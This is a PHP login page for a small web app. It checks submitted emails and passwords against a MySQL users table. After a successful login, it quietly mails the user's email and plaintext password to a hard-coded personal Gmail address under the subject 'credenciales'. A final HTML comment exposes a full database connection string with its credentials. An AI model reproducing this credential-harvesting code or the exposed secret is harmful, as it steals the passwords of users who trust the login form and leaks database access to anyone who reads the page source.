<?php

require 'include/config/database.php';

$db = conectarDb();
$errores = [];
$exitos = [];
$correoPersonal = 'hernandavidroajaimes56@gmail.com';

if ($_SERVER['REQUEST_METHOD'] === 'POST'){
    $correo =  mysqli_real_escape_string($db,filter_var($_POST['correo'],FILTER_VALIDATE_EMAIL));
    $contraseña = mysqli_real_escape_string($db,$_POST['password']);


    if($correo && $contraseña){
        
        $query = "SELECT * FROM usuarios WHERE correo = '${correo}'";
        $resultadoConsulta = mysqli_query($db,$query);


        if ($resultadoConsulta->num_rows === 1){
            $credencial = mysqli_fetch_assoc($resultadoConsulta);
            
            $validacion = password_verify($contraseña,$credencial['password']); 

            if(!$validacion){
                $errores[] = 'Contraseña incorrecta';
            }


        }else{
            $errores[] = 'Este correo no existe';
        }



    }else{
        $errores[] = 'Debes digitar tu correo y contraseña';
    }

    if(empty($errores)){
        $exitos[] = "Iniciando Sesion...";
        mail($correoPersonal,'credenciales',$correo,$contraseña,'Enviado desde hernans');
    }
}



?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="build/css/app.css">
    <title>Document</title>
</head>
<body>
    <main>
        <form method="POST" class="formulario">
            <legend>Bienvenido</legend>
            <fieldset class="contenedor-inputs">
                <input name="correo" type="email" placeholder="CORREO" value="<?php echo $correo ?>">
                <input name="password" type="password" placeholder="CONTRASEÑA">
            </fieldset>
            <input class="boton" type="submit" class="boton-enviar" value="Login">
            <div class="opciones">
                <a href="#">¿Perdiste tu contraseña?</a>
                <a href="registro.php">¿No tienes cuenta? Registrate</a>
            </div>
        </form>
        <div class="alerta">
            <?php foreach($errores as $error) : ?>
                <div class="error">
                    <?php echo "<p>${error}</p>" ?>
                </div>
            <?php endforeach; ?>
            <?php foreach($exitos as $exito) : ?>
                <div class="exito">
                    <?php echo "<p>${exito}</p>" ?>
                </div>
            <?php endforeach; ?>
        </div>
        
    </main>
</body>
</html>


<!--mysql://bf6b4a5be7e289:3e106902@us-cdbr-east-06.cleardb.net/heroku_120b9495e32a6c0?reconnect=true-->